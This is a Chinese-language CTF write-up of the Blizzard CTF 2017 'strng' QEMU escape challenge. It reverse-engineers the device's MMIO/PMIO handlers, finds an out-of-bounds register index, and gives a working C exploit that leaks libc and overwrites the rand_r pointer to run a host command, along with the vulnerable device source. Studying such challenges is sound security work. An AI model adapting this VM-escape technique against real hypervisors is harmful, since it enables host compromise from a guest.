## Pwn

### strng

參考資料:

- [raycp](https://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup)
  - 除了這篇之外，此作者也寫了許多關於 Qemu 的文章
- [kangel](https://j-kangel.github.io/2019/11/27/Strng/#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90)
- [作者朋友(?)的 writeup](https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html)



題目描述：

> Sombra True Random Number Generator (STRNG):
>
> Sombra True Random Number Generator (STRNG) is a QEMU-based challenge developed for Blizzard CTF 2017. The challenge was to achieve a VM escape from a QEMU-based VM and capture the flag located at /root/flag on the host. The image used and distributed with the challenge was the Ubuntu Server 14.04 LTS Cloud Image. The host used the same image as the guest. The guest was reset every 10 minutes and was started with the following command: ./qemu-system-x86_64 -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -enable-kvm -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22 Access to the guest was provided by redirecting incoming connections to the host on port 5555 to the guest on port 22.

kernel version 為 **Linux version 3.13.0-129-generic**；作業系統使用 **ubuntu 14.04**



根據描述，執行腳本如下：

```bash
#!/bin/bash
./qemu-system-x86_64 \
	-m 1G \
	-device strng \
	# -hda, -hdb: Use file as hard disk 0 and 1 image
	-hda my-disk.img \
	-hdb my-seed.img \
	-nographic \
	# -L: Set the directory for the BIOS, VGA BIOS and keymaps
	-L pc-bios/ \
	-enable-kvm \
	-device e1000,netdev=net0 \
	# user 代表 user network
	# localhost 的 5555 port 導向 guest 的 22 port
	-netdev user,id=net0,hostfwd=tcp::5555-:22 
```



根據 qemu 指令，可以透過 `lspci` 確定 devide **strng** 有被

```
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)
```

- `lspci` - a utility for displaying information about **PCI buses**
  - PCI (Peripheral Component Interconnect) 是一種連接電腦主機板和外部裝置的匯流排標準
  - 一般PCI裝置可分為以下兩種形式：
    - 直接內建於主機板上的積體電路，在 PCI 規範中稱作**嵌入裝置** (planar device)
    - 安裝在插槽上的擴充介面卡



將 binary **qemu-system-x86_64** 丟入 IDA 當中，並且搜尋包含 **strng** 字串的 function:

- `do_qemu_init_pci_strng_register_types()`
  - 只呼叫 `register_module_init(pci_strng_register_types, MODULE_INIT_QOM)`，看起來是透過定義好的 QOM 來註冊 **strng** device
- `pci_strng_register_types()`
  - 呼叫 `type_register_static(&strng_info_25910)`，而 `strng_info_25910` 的型態為 `TypeInfo`，感覺起來也是與註冊相關，不過是註冊 **type**
- `strng_class_init()`
- `pci_strng_realize()`
- `strng_instance_init()`
- `strng_mmio_read()`
- `strng_mmio_write()`
- `strng_pmio_read()`
- `strng_pmio_write()`



首先 `pci_strng_register_types()` 會去註冊使用者提供的 `TypeInfo`，而 `TypeInfo.instance_init` 指向的是 `strng_instance_init()`，`TypeInfo.class_init` 指向 `strng_class_init()`

- `instance_init`: 初始化並建立 `Object` instance
- `class_init`: 初始化並建立 `ObjectClass` instance



`strng_class_init()` 程式碼如下：

```c
void __fastcall strng_class_init(ObjectClass_0 *a1, void *data)
{
  PCIDeviceClass *k; // rax

  k = object_class_dynamic_cast_assert(
        a1,
        &stru_684F40.bulk_in_pending[0].data[335],
        "/home/rcvalle/qemu/hw/misc/strng.c",
        0x9A,
        "strng_class_init");
  k->device_id = 0x11E9;
  k->revision = 0x10;
  k->realize = pci_strng_realize;
  k->class_id = 0xFF;
  k->vendor_id = 0x1234;
}
```

- 可以比對 `lspci` 的結果，剛好有一個 device 符合: `00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)`

  - 0x1234 為 `vendor_id`
  - 0x11e9 為 `device_id`

- struct `PCIDeviceClass` 為:

  ```c
  struct PCIDeviceClass
  {
    DeviceClass_0 parent_class;
    void (*realize)(PCIDevice_0 *, Error_0 **);
    int (*init)(PCIDevice_0 *);
    PCIUnregisterFunc *exit;
    PCIConfigReadFunc *config_read;
    PCIConfigWriteFunc *config_write;
    uint16_t vendor_id;
    uint16_t device_id;
    uint8_t revision;
    uint16_t class_id;
    uint16_t subsystem_vendor_id;
    uint16_t subsystem_id;
    int is_bridge;
    int is_express;
    const char *romfile;
  };
  ```



由上面的資訊可以得到 device slot 為 **00:03.0**，用 `lspci -v -s 00:03.0` 印出更詳細的資訊：

```shell
ubuntu@ubuntu:~$ lspci -v -s 00:03.0
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
        Subsystem: Red Hat, Inc Device 1100
        Physical Slot: 3
        Flags: fast devsel
        Memory at febf1000 (32-bit, non-prefetchable) [size=256]
        I/O ports at c050 [size=8]
```

- MMIO 為 `0xfebf1000`，大小為 256 bytes

- IO port 從 `0xc050` 開始，一共有 8 個 ports (`0xc050` - `0xc057`)

- `ls /sys/devices/pci0000\:00/0000\:00\:03.0/` 查看關於此 device 的一些資訊

  - resource - 格式為 **\<start-address\> \<end-address\> \<flags\>**

    ```shell
    ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
    0x00000000febf1000 0x00000000febf10ff 0x0000000000040200 # 共 256 bytes
    0x000000000000c050 0x000000000000c057 0x0000000000040101 # 共 8 個 ports
    ...
    ```

  - resource0 - MMIO

  - resource1 - PMIO

- `/proc/ioports` 為各個 device 的 IO

- `/proc/iomem` 顯示對應的 memory address (root required)



`strng_instance_init()` 的程式碼如下：

```c
void __fastcall strng_instance_init(Object_0 *obj)
{
  STRNGState *v1; // rax

  v1 = object_dynamic_cast_assert(obj, "strng", "/home/rcvalle/qemu/hw/misc/strng.c", 145, "strng_instance_init");
  v1->srand = &srand;
  v1->rand = &rand;
  v1->rand_r = &rand_r;
}
```

- 設置 **strng** object 的 function pointer



`pci_strng_realize()` 的程式碼如下：

```c
void __fastcall pci_strng_realize(STRNGState *pdev, Error_0 **errp)
{
  // strng_mmio_read, strng_mmio_write
  memory_region_init_io(&pdev->mmio, &pdev->pdev.qdev.parent_obj, &strng_mmio_ops, pdev, "strng-mmio", 0x100uLL);
  pci_register_bar(&pdev->pdev, 0, 0, &pdev->mmio);
  
  // strng_pmio_read, strng_pmio_write
  memory_region_init_io(&pdev->pmio, &pdev->pdev.qdev.parent_obj, &strng_pmio_ops, pdev, "strng-pmio", 8uLL);
  pci_register_bar(&pdev->pdev, 1, 1u, &pdev->pmio);
}
```

- 設置 **mmio** 與 **pmio**
- mmio
  - 用 `strng_mmio_read()` 讀
  - 用 `strng_mmio_write()` 寫
- pmio
  - 用 `strng_pmio_read()` 讀
  - 用 `strng_pmio_write()` 寫
- 通常是 mmio 跟 pmio 的讀寫最容易出問題

`strng_pmio_ops` 的型態為 `struct MemoryRegionOps`，結構如下:

```c
// or see https://github.com/portante/qemu/blob/master/memory.h#L57
struct MemoryRegionOps
{
  uint64_t (*read)(void *, hwaddr, unsigned int);
  void (*write)(void *, hwaddr, uint64_t, unsigned int);
  MemTxResult (*read_with_attrs)(void *, hwaddr, uint64_t *, unsigned int, MemTxAttrs_0);
  MemTxResult (*write_with_attrs)(void *, hwaddr, uint64_t, unsigned int, MemTxAttrs_0);
  device_endian endianness;
  // 因為當初在宣告時並沒有名稱，因此 IDA 解不出來
  $3FCBBA1D4757AC4558CB1471965FEAC8 valid;
  $D8E091644282A7AA1778C6250BBE68F4 impl;
  const MemoryRegionMmio_0 old_mmio;
};
```

- 定義了 read / write mappings 時會使用哪些 function





`strng_mmio_read()` 程式碼如下:

```c
uint64_t __fastcall strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax

  result = -1LL;
  // 只能讀 4 bytes
  // addr 要 align 0x4
  if ( size == 4 && (addr & 3) == 0 )
    return opaque->regs[addr >> 2]; // return as register index
  return result;
}
```



`strng_mmio_write()` 的程式碼如下:

```c
void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  hwaddr v4; // rsi
  int v5; // eax
  int vala; // [rsp+8h] [rbp-30h]

  // 寫入大小為 4，並且位址對齊 0x4
  if ( size == 4 && (addr & 3) == 0 )
  {
    v4 = addr >> 2; // 0b100 == 0x4
    if ( v4 == 1 )
    {
      // rand a number and put result into regs[1]
      opaque->regs[1] = (opaque->rand)();
    }
    else if ( v4 )
    {
      if ( v4 == 3 ) // 0b300 = 0xc
      {
        vala = val;
        // rand a number with regs[2] as seed and put result into regs[3]
        v5 = opaque->rand_r(&opaque->regs[2]);
        LODWORD(val) = vala;
        opaque->regs[3] = v5;
      }
      // 取 (addr >> 2) 後得到的位址作為 index，寫入 val
      opaque->regs[v4] = val;
    }
    else // 0b000 = 0
    {
      // assign new seed
      opaque->srand(val);
    }
  }
}
```

- pci 內部會檢查傳入的大小，因此無法傳入會讓 index 超過 256 (mmio 的大小) 的位址



再來是關於 r/w pmio 的部分，`strng_pmio_read()` 的程式碼如下:

```c
uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  uint32_t v4; // edx

  result = -1LL;
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        v4 = opaque->addr;
        if ( (v4 & 3) == 0 ) // align 0x4
          return opaque->regs[v4 >> 2];
      }
    }
    else // addr == 0
    {
      return opaque->addr;
    }
  }
  return result;
}
```

- addr 使用 `opaque->addr` 而非傳入的 `addr`



`strng_pmio_write()` 的程式碼如下:

```c
void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t v4; // eax
  __int64 v5; // rax

  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        v4 = opaque->addr;
        if ( (v4 & 3) == 0 )
        {
          v5 = v4 >> 2;
          if ( v5 == 1 ) // 0b100
          {
            // rand a number and put result into regs[1]
            opaque->regs[1] = (opaque->rand)();
          }
          else if ( v5 )
          {
            if ( v5 == 3 ) // 0b1100
              opaque->regs[3] = (opaque->rand_r)(&opaque->regs[2], 4LL, val);
            else
              opaque->regs[v5] = val;
          }
          else // 0b000
          {
            // assign new seed
            opaque->srand(val);
          }
        }
      }
    }
    else
    {
      // addr == 0
      opaque->addr = val;
    }
  }
}
```

- 同上，是用 `opaque->addr` 來作為 index
- 而當 addr 為 0 時，我們可以控制 `opaque->addr` 的內容



可以在 gdb 當中使用 `p *(STRNGState *)$rdi` 來印出整個 `STRNGState` 結構，而其中可以 leak 出存在於 `STRNGState.regs` 下方的 `rand` 而得到 libc address

```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/io.h>
#include <stdint.h>

// gcc -m32 -O0 -static -o exp exp.c

unsigned char *mmio_mem;
uint32_t pmio_base = 0xc050; // I/O port

uint32_t mmio_read(uint32_t addr)
{
	return *((uint32_t *)(mmio_mem + addr));
}

void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t *)(mmio_mem + addr)) = value;
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t) inl(addr);
}

uint32_t pmio_write(uint32_t addr, uint32_t value)
{
    outl(value, addr);
}

uint32_t pmio_aar(uint32_t offset)
{
    pmio_write(pmio_base + 0, offset);
    return pmio_read(pmio_base + 4);
}

uint32_t pmio_aaw(uint32_t offset, uint32_t value)
{
    pmio_write(pmio_base + 0, offset);
    pmio_write(pmio_base + 4, value);
}

int main()
{
    // create "/bin/sh" to regs[2]
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        pexit("[-] open mmio interface failed");

    mmio_mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        pexit("[-] mmap mmio_fd failed");

    // touch Z
    // cannot be /bin/sh otherwise you will receive an err msg:
    // "sh: turning off NDELAY mode"
    mmio_write(0xc, 0x005a2068);
    mmio_write(0x8, 0x63756f74);

    // leak and overwrite function pointer
    if (iopl(3) != 0)
        pexit("[-] iopl failed");
    uint64_t libc = pmio_aar(0x110);
    libc <<= 32;
    libc += pmio_aar(0x10c);
    libc -= 0x4ae90; // offset of rand()
    uint64_t system_addr = libc + 0x55410;
    printf("[*] libc: 0x%016llx\n", libc);
    printf("[*] system: 0x%016llx\n", system_addr);

    /* overwrite the pointer of rand_r */
    pmio_aaw(0x114, system_addr & 0xffffffff);
    mmio_write(0xc, 0xdeadbeef);

    return 0;
}
```



Others

- `outl`, `inl` 底層是用 asm instruction 直接存取 device port，不過還有其他方法也可以對 device 做讀寫

  - `dd if=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1`

    - 從 MMIO 讀 4 bytes

  - `dd if=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1 skip=1`

    - > use index 0 as offset address to read from

    - 看起來是從 index 1 讀，不是很確定

  - `dd if=XXX of=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1`

    - 寫 4 bytes 到 MMIO

  - `dd if=XXX of=/sys/devices/pci0000\:00/0000\:00\:03.0/resource1 bs=4 count=1 skip=1`

    - > use index 0 as offset to write to

  - 直接對 `/dev/port` 的 offset `0xc050` - `0xc057` 做讀寫也可以



補充 user space version 的 `gva_to_gpa()`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <inttypes.h>

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT) // 0x1000
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1) // page frame number

#define page_offset(addr) ((uint64_t) addr & ((1 << PAGE_SHIFT) - 1))

void pexit(const char *msg)
{
	perror(msg);
    exit(1);
}

int fd;

uint64_t gva_to_gfn(void *addr)
{
    // page memory entry (?) and guest frame number
	uint64_t pme;
   	size_t offset;
    
    offset = ((uintptr_t) addr >> 9) & ~7;
	printf("[+] offset:\t0x%016" PRIx64 "\n", offset);
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
  	printf("[+] pme:\t0x%016" PRIx64 "\n", pme);
    if (!(pme & PFN_PRESENT))
        return -1;
    return pme & PFN_PFN;
}

uint64_t gva_to_gpa(void *addr)
{
	uint64_t gfn = gva_to_gfn(addr);
    if (gfn == -1)
        pexit("[-] gva_to_gfn failed");
  	printf("[+] gfn:\t0x%016" PRIx64 "\n", gfn);
   	printf("[+] page_off:\t0x%016" PRIx64 "\n", page_offset(addr));
    return (gfn << PAGE_SHIFT) | page_offset(addr);
}

int main()
{
	fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        pexit("[-] open fd failed");
   	
    char *ptr = (char *) malloc(0x100);
    strcpy(ptr, "Where I am ?");
    printf("[+] Viraddr:\t%p\n", ptr);
    
    uint64_t ptr_mem = gva_to_gpa(ptr);
    printf("[+] Phyaddr:\t0x%016" PRIx64 "\n", ptr_mem);
    return 0;
}
```

- `/proc/self/pagemap`
  - This file lets a userspace process find out which physical frame each virtual page is mapped to.
  - It contains one 64-bit value for each virtual page, containing the following data (from [fs/proc/task_mmu.c](https://elixir.bootlin.com/linux/latest/source/fs/proc/task_mmu.c#L1578))
    - Bits 0-54  page frame number (PFN) if present
      - Bits 0-4   swap type if swapped
      - Bits 5-54  swap offset if swapped
    - Bit  55    pte is soft-dirty (see Documentation/admin-guide/mm/soft-dirty.rst)
    - Bit  56    page exclusively mapped
    - Bits 57-60 zero
    - Bit  61    page is file-page or shared-anon
    - Bit  62    page swapped
    - Bit  63    page present



---



附上[官方 repo](https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c) 找到的 strng.c 原始碼：

```c
#include "qemu/osdep.h"
#include "hw/pci/pci.h"

#define STRNG(obj) OBJECT_CHECK(STRNGState, obj, "strng")

#define STRNG_MMIO_REGS 64
#define STRNG_MMIO_SIZE (STRNG_MMIO_REGS * sizeof(uint32_t))

#define STRNG_PMIO_ADDR 0
#define STRNG_PMIO_DATA 4
#define STRNG_PMIO_REGS STRNG_MMIO_REGS
#define STRNG_PMIO_SIZE 8

typedef struct {
    PCIDevice pdev;
    MemoryRegion mmio;
    MemoryRegion pmio;
    uint32_t addr;
    uint32_t regs[STRNG_MMIO_REGS];
    void (*srand)(unsigned int seed);
    int (*rand)(void);
    int (*rand_r)(unsigned int *seed);
} STRNGState;

static uint64_t strng_mmio_read(void *opaque, hwaddr addr, unsigned size)
{
    STRNGState *strng = opaque;

    if (size != 4 || addr & 3)
        return ~0ULL;

    return strng->regs[addr >> 2];
}

static void strng_mmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size)
{
    STRNGState *strng = opaque;
    uint32_t saddr;

    if (size != 4 || addr & 3)
        return;

    saddr = addr >> 2;
    switch (saddr) {
    case 0:
        strng->srand(val);
        break;

    case 1:
        strng->regs[saddr] = strng->rand();
        break;

    case 3:
        strng->regs[saddr] = strng->rand_r(&strng->regs[2]);

    default:
        strng->regs[saddr] = val;
    }
}

static const MemoryRegionOps strng_mmio_ops = {
    .read = strng_mmio_read,
    .write = strng_mmio_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
};

static uint64_t strng_pmio_read(void *opaque, hwaddr addr, unsigned size)
{
    STRNGState *strng = opaque;
    uint64_t val = ~0ULL;

    if (size != 4)
        return val;

    switch (addr) {
    case STRNG_PMIO_ADDR:
        val = strng->addr;
        break;

    case STRNG_PMIO_DATA:
        if (strng->addr & 3)
            return val;

        val = strng->regs[strng->addr >> 2];
    }

    return val;
}

static void strng_pmio_write(void *opaque, hwaddr addr, uint64_t val, unsigned size)
{
    STRNGState *strng = opaque;
    uint32_t saddr;

    if (size != 4)
        return;

    switch (addr) {
    case STRNG_PMIO_ADDR:
        strng->addr = val;
        break;

    case STRNG_PMIO_DATA:
        if (strng->addr & 3)
            return;

        saddr = strng->addr >> 2;
        switch (saddr) {
        case 0:
            strng->srand(val);
            break;

        case 1:
            strng->regs[saddr] = strng->rand();
            break;

        case 3:
            strng->regs[saddr] = strng->rand_r(&strng->regs[2]);
            break;

        default:
            strng->regs[saddr] = val;
        }
    }
}

static const MemoryRegionOps strng_pmio_ops = {
    .read = strng_pmio_read,
    .write = strng_pmio_write,
    .endianness = DEVICE_LITTLE_ENDIAN,
};

static void pci_strng_realize(PCIDevice *pdev, Error **errp)
{
    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev);

    memory_region_init_io(&strng->mmio, OBJECT(strng), &strng_mmio_ops, strng, "strng-mmio", STRNG_MMIO_SIZE);
    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &strng->mmio);
    memory_region_init_io(&strng->pmio, OBJECT(strng), &strng_pmio_ops, strng, "strng-pmio", STRNG_PMIO_SIZE);
    pci_register_bar(pdev, 1, PCI_BASE_ADDRESS_SPACE_IO, &strng->pmio);
}

static void strng_instance_init(Object *obj)
{
    STRNGState *strng = STRNG(obj);

    strng->srand = srand;
    strng->rand = rand;
    strng->rand_r = rand_r;
}

static void strng_class_init(ObjectClass *class, void *data)
{
    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);

    k->realize = pci_strng_realize;
    k->vendor_id = PCI_VENDOR_ID_QEMU;
    k->device_id = 0x11e9;
    k->revision = 0x10;
    k->class_id = PCI_CLASS_OTHERS;
}

static void pci_strng_register_types(void)
{
    static const TypeInfo strng_info = {
        .name          = "strng",
        .parent        = TYPE_PCI_DEVICE,
        .instance_size = sizeof(STRNGState),
        .instance_init = strng_instance_init,
        .class_init    = strng_class_init,
    };

    type_register_static(&strng_info);
}
type_init(pci_strng_register_types)
```

